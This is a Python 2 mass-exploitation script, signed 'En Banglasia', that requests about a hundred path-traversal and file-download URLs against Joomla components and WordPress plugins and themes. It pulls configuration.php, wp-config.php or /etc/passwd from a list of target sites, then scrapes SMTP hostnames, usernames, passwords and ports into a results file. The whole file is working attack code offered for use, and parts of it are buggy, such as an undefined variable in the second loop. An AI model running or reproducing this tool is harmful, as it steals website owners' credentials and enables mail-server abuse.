#!/usr/bin/python2
import urllib2
import re
import sys
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool


import requests
import re
import urllib
import urllib2
import os
import sys
import codecs
import binascii
import json
import argparse
from multiprocessing.dummy import Pool
from time import time as timer
import time
from random import sample as rand
from Queue import Queue
from platform import system
from urlparse import urlparse
from optparse import OptionParser
from colorama import Fore
from colorama import Style
from pprint import pprint
from colorama import init
init(autoreset=True)


####### Colors	 ######

fr = Fore.RED
fc = Fore.YELLOW
fw = Fore.GREEN
fg = Fore.BLUE
sd = Style.NORMAL
sn = Style.BRIGHT
sb = Style.NORMAL

######################

shells = [
    '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php',
    '/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php',
    '/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=',
    '/index.php?jat3action=gzip&type=css&file=configuration.php',
    '/plugins/content/jw_allvideos/includes/download.php?file=../../../../configuration.php',
    '/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1',
    '/index.php?option=com_cckjseblod&task=download&file=configuration.php',
    '/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php',
    '/index.php?option=com_community&view=groups&groupid=1&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0',
    '/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes',
    '/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=',
    '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php',
    '/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php',
    '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php',
    'index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php',
    '/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==',
    '/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php',
    '/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php',
    '/index.php?option=com_jetext&task=download&file=../../configuration.php',
    '/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1',
    '/jojo/index.php?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&jat3action=gzip&type=css&v=1',
    '/index.php?option=com_download-monitor&file=configuration.php',
    '/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php',
    '/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=',
    '/wp-content/themes/epic/includes/download.php?file=../../../../wp-config.php',
    '/wp-content/plugins/recent-backups/download-file.php?file_link=../../../wp-config.php',
    '/wp-content/plugins/db-backup/download.php?file=../../../wp-config.php',
    '/wp-content/plugins/wptf-image-gallery/lib-mbox/ajax_load.php?url=../../../../wp-config.php',
    '/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=../../../wp-config.php',
    '/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php',
    '/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php',
    '/wp-content/force-download.php?file=../wp-config.php',
    '/wp-content/blog/secondaryphase/mdocs-posts/?mdocs-img-preview=../../../../wp-config.php',
    '/wp-admin/blog/admin-ajax.php?action=revslider_show_image&img=../../wp-config.php',
    '/mdocs-posts/?mdocs-img-preview=../wp-config.php',
    '/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php',
    '/force-download.php?file=wp-config.php',
    '/wp-content/plugins/dukapress/lib/dp_image.php?src=../../../../wp-config.php',
    '/wp-content/plugins/plugin-newsletter/preview.php?data=../../../wp-config.php',
    '/wp-content/plugins/simple-download-button-shortcode/simple-download-button_dl.php?file=../../../wp-config.php',
    '/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php',
    '/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10',
    '/wp-content/plugins/wp-source-control/downloadfiles/download.php?path=../../../../wp-config.php',
    '/wp-content/plugins/bookx/includes/bookx_export.php?file=../../../../wp-config.php',
    '/wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php',
    '/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php',
    '/wp-content/plugins/simple-image-manipulator/controller/download.php?filepath=../../../../wp-config.php',
    '/wp-content/plugins/mdc-youtube-downloader/includes/download.php?file=../../../../wp-config.php',
    '/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php',
    '/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=../../../../../wp-config.php',
    '/wp-content/plugins/filedownload/download.php/?path=../../../wp-config.php',
    '/wp-content/plugins/pica-photo-gallery/picadownload.php?imgname=../../../wp-config.php',
    '/wp-content/plugins/imdb-widget/pic.php?url=../../../wp-config.php',
    '/wp-content/plugins/harma-booking/frontend/ajax/gateways/proccess.php?gateway=../../../../../../wp-config.php',
    '/wp-content/plugins/mdocs-posts/?mdocs-img-preview=../../../wp-config.php',
    '/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php',
    '/wp-content/plugins/image-export/download.php?file=../../../wp-config.php',
    '/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../wp-config.php',
    '/wp-content/plugins/sell-downloads/sell-downloads.php?file=./../../../wp-config.php',
    '/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../wp-config.php',
    '/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php',
    '/wp-content/plugins/robotcpa/f.php?l=cGhwOi8vZmlsdGVyL3Jlc291cmNlPS4vLi4vLi4vLi4vd3AtY29uZmlnLnBocA==',
    '/wp-content/plugins/history-collection/download.php?var=../../../wp-config.php',
    '/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php',
    '/wp-content/plugins/cloudsafe365-for-wp/admin/editor/cs365_edit.php?file=../../../../../wp-config.php',
    '/wp-content/plugins/mailz/lists/config/config.php?wpabspath=../../../../../wp-config.php',
    '/wp-content/plugins/disclosure-policy-plugin/functions/action.php?delete=asdf&blogUrl=asdf&abspath=../../../../wp-config.php',
    '/wp-content/plugins/accept-signups/accept-signups_submit.php?file=../../../wp-config.php',
    '/wp-content/plugins/wp-filemanager/incl/libfile.php?path=&filename=../../../../wp-config.php&action=download',
    '/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?path=../../../../../../../wp-config.php',
    '/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php',
    '/wp-content/plugins/wp-swimteam/include/user/download.php?file=../../../wp-config.php&filename=../../../wp-config.php&contenttype=text/html&transient=1',
    '/wp-content/plugins/thecartpress/modules/Miranda.class.php?page=../../../../wp-config.php%00',
    '/wp-content/plugins/rb-agency/ext/forcedownload.php?file=../../../../wp-config.php',
    '/wp-content/plugins/paypal-currency-converter-basic-for-woocommerce/proxy.php?requrl=../../../wp-config.php',
    '/wp-content/plugins/document_manager/views/file_download.php?fname=../../../../wp-config.php',
    '/wp-content/plugins/cip4-folder-download-widget/cip4-download.php?target=wp-config.php&info=wp-config.php',
    '/wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../wp-config.php',
    '/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php',
    '/wp-content/plugins/advanced-uploader/upload.php?destinations=../../../wp-config.php%00',
    '/wp-content/plugins/abtest/abtest_admin.php?action=../../../wp-config.php',
    '/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php',
    '/wp-content/themes/Newspapertimes_1/download.php?filename=../../../wp-config.php',
    '/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php',
    '/wp-content/themes/corporate_works/downloader.php?file_download=../../wp-config.php',
    '/wp-content/themes/parallelus-mingle/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php',
    '/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=../../../../../../wp-config.php',
    '/wp-content/themes/tess/download.php?file=../../../wp-config.php',
    '/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php',
    '/wp-content/themes/yakimabait/download.php?file=../../../wp-config.php',
    '/wp-content/themes/ypo-theme/download.php?download=../../../../wp-config.php',
    '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php',
    '/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php',
    '/wp-content/themes/acento/includes/view-pdf.php?download=1&file=../../../../wp-config.php',
    '/wp-content/themes/ypo-theme/download.php?download=..%2F..%2F..%2F..%2Fwp-config.php',
    '/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php',
    '/wp-content/themes/lote27/download.php?download=../../../wp-config.php',
    '/wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php',
    '/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php',
    '/wp-content/themes/SMWF/inc/download.php?file=../../../../wp-config.php',
    '/wp-content/themes/persuasion/lib/scripts/dl-skin.php',
    '/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php',
    '/wp-content/themes/FR0_theme/down.php?path=../../../wp-config.php']
foundshells = []

print '''
 ____  __  __ _____ ____    _____ ___  _   _ _   _ ____
/ ___||  \/  |_   _|  _ \  |  ___/ _ \| | | | \ | |  _
\___ \| |\/| | | | | |_) | | |_ | | | | | | |  \| | | | |
 ___) | |  | | | | |  __/  |  _|| |_| | |_| | |\  | |_| |
|____/|_|  |_| |_| |_|     |_|   \___/ \___/|_| \_|____/

        [+] Mass Fuckedz SMTP By En Banglasia [+]\n'''

try:
    dork = raw_input("[+] Put Your Fucking List [+] :~# ")
    with codecs.open(dork, mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))


def bypass(url):

    try:

                # 25 . rev
        for shell in shells:

            aCaaxcrevlib = requests.get(url + shell)

            if 'mailfrom' in aCaaxcrevlib.text:

                hoststmp = re.findall("smtphost = '(.*?)';", aCaaxcrevlib.text)
                userstmp = re.findall("smtpuser = '(.*?)';", aCaaxcrevlib.text)
                passstmp = re.findall("smtppass = '(.*?)';", aCaaxcrevlib.text)
                portstmp = re.findall("smtpport = '(.*?)';", aCaaxcrevlib.text)
                print '\n' + '[+] Simple Mail Protocol Server [+]\n' + '[+] Hostname: ' + hoststmp[0] + '\n' + '[+] Port: ' + \
                    portstmp[0] + '\n' + '[+] Username: ' + userstmp[0] + '\n' + '[+] Password: ' + passstmp[0] + '\n'
                open(
                    'Results/SMTPs.txt',
                    'a').write(
                    '[+] Hostname: '+hoststmp[0] +
                    '\n' +
                    '[+] Port: '+portstmp[0] +
                    '\n' +
                    '[+] Username: '+userstmp[0] +
                    '\n' +
                    '[+] Password: '+passstmp[0] +
                    '\n\n')
                print '[{}SMTP => Fuckedz] {} {} ===> {}{} Successfully! '.format(
                    sb, sd, url, fc, fc, sb, fg)
                sys.exit()
            else:
                print '[{}Target] {} {} ===> {}{} SMTP {}{} Not Found '.format(
                    sb, sd, url, fc, fc, sb, fr)

                # gravity
        for shell in shells:

            aCaxxgravlib = requests.get(url + shell)

            if 'mailfrom' in aSaaxcewlib.text:

                hoststmp = re.findall("smtphost = '(.*?)';", aCaxxgravlib.text)
                userstmp = re.findall("smtpuser = '(.*?)';", aCaxxgravlib.text)
                passstmp = re.findall("smtppass = '(.*?)';", aCaxxgravlib.text)
                portstmp = re.findall("smtpport = '(.*?)';", aCaxxgravlib.text)
                print '\n' + '[+] Simple Mail Protocol Server [+]\n' + '[+] Hostname: ' + hoststmp[0] + '\n' + '[+] Port: ' + \
                    portstmp[0] + '\n' + '[+] Username: ' + userstmp[0] + '\n' + '[+] Password: ' + passstmp[0] + '\n'
                open(
                    'Results/SMTPs.txt',
                    'a').write(
                    '[+] Hostname: '+hoststmp[0] +
                    '\n' +
                    '[+] Port: '+portstmp[0] +
                    '\n' +
                    '[+] Username: '+userstmp[0] +
                    '\n' +
                    '[+] Password: '+passstmp[0] +
                    '\n\n')
                print '[{}SMTP => Fuckedz] {} {} ===> {}{} Successfully! '.format(
                    sb, sd, url, fc, fc, sb, fg)
                sys.exit()
            else:
                print '[{}Target] {} {} ===> {}{} SMTP {}{} Not Found '.format(
                    sb, sd, url, fc, fc, sb, fr)

                # priv8
        for shell in shells:

            text = requests.get(url + shell)

            if 'public' in text:

                hoststmp = re.findall("smtphost = '(.*?)';", text)
                userstmp = re.findall("smtpuser = '(.*?)';", text)
                passstmp = re.findall("smtppass = '(.*?)';", text)
                portstmp = re.findall("smtpport = '(.*?)';", text)
                print '\n' + '[+] Simple Mail Protocol Server [+]\n' + '[+] Hostname: ' + hoststmp[0] + '\n' + '[+] Port: ' + \
                    portstmp[0] + '\n' + '[+] Username: ' + userstmp[0] + '\n' + '[+] Password: ' + passstmp[0] + '\n'
                open(
                    'Results/SMTPs.txt',
                    'a').write(
                    '[+] Hostname: '+hoststmp[0] +
                    '\n' +
                    '[+] Port: '+portstmp[0] +
                    '\n' +
                    '[+] Username: '+userstmp[0] +
                    '\n' +
                    '[+] Password: '+passstmp[0] +
                    '\n\n')
                print '[{}SMTP => Fuckedz] {} {} ===> {}{} Successfully! '.format(
                    sb, sd, url, fc, fc, sb, fg)
                sys.exit()
            else:
                print '[{}Target] {} {} ===> {}{} SMTP {}{} Not Found '.format(
                    sb, sd, url, fc, fc, sb, fr)

    except BaseException:
        pass


def Main():
    try:

        start = timer()
        ThreadPool = Pool(40)
        Threads = ThreadPool.map(bypass, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except BaseException:
        pass


if __name__ == '__main__':
    Main()
